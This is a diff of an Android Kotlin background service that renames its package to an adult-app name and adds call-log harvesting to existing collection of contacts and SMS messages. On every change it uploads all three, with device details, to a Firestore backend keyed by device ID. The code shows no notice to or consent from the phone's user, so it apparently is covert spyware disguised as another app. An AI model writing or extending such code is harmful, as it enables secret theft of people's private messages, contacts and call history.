@@ -1,4 +1,4 @@
-package com.datasync.user.sync
+package com.boxx.porn.sync
 
 import android.app.*
 import android.content.Context
@@ -9,19 +9,26 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import androidx.core.app.NotificationCompat
-import com.datasync.user.MainActivity
-import com.datasync.user.data.FirestoreRepository
-import com.datasync.user.model.DeviceInfo
-import com.datasync.user.utils.DataHelper
-import com.datasync.user.utils.DeviceIdHelper
+import com.boxx.porn.MainActivity
+import com.boxx.porn.data.FirestoreRepository
+import com.boxx.porn.model.DeviceInfo
+import com.boxx.porn.utils.DataHelper
+import com.boxx.porn.utils.DeviceIdHelper
+import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
+import javax.inject.Inject
 
+@AndroidEntryPoint
 class SyncService : Service() {
-    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
-    private val repository = FirestoreRepository()
+
+    @Inject
+    lateinit var repository: FirestoreRepository
+
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private lateinit var deviceId: String
 
     private var syncJob: Job? = null
@@ -33,6 +40,12 @@ class SyncService : Service() {
     }
 
     private val smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+        override fun onChange(selfChange: Boolean) {
+            debouncedSync()
+        }
+    }
+
+    private val callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
         override fun onChange(selfChange: Boolean) {
             debouncedSync()
         }
@@ -55,6 +68,7 @@ class SyncService : Service() {
 
         contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver)
         contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
+        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -74,9 +88,11 @@ class SyncService : Service() {
         try {
             val contacts = DataHelper.fetchContacts(this@SyncService)
             val smsList = DataHelper.fetchSMS(this@SyncService)
+            val callLogs = DataHelper.fetchCallLogs(this@SyncService)
 
             repository.syncContacts(deviceId, contacts)
             repository.syncSMS(deviceId, smsList)
+            repository.syncCallLogs(deviceId, callLogs)
 
             repository.updateDeviceInfo(DeviceInfo(
                 deviceName = Build.MODEL,
@@ -84,6 +100,7 @@ class SyncService : Service() {
                 lastSyncTime = System.currentTimeMillis(),
                 contactCount = contacts.size,
                 smsCount = smsList.size,
+                callLogCount = callLogs.size,
                 timestamp = System.currentTimeMillis()
             ))
         } catch (e: Exception) {
@@ -122,5 +139,6 @@ class SyncService : Service() {
         serviceScope.cancel()
         contentResolver.unregisterContentObserver(contactObserver)
         contentResolver.unregisterContentObserver(smsObserver)
+        contentResolver.unregisterContentObserver(callLogObserver)
     }
 }
